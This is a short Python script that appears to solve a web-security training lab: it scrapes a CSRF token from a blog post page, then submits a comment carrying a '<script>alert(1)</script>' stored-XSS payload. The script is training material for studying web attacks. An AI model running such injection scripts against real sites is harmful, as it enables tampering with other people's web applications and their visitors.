from ...utils import *
from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/post")
    params = {"postId": 1}
    print_info(f'Grabbing CSRF value from "{url}?{urlencode(params)}"')

    s = requests.session()
    resp = s.get(url, params=params, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    url = urljoin(url, "/post/comment")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": "<script>alert(1)</script>",
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    print_info(
        "Performing stored XSS attack by posting a comment with the following values:"
    )
    print(data)

    resp = s.post(url, proxies=proxies, verify=False, data=data)
    print_success("Stored XSS attack performed.\n")
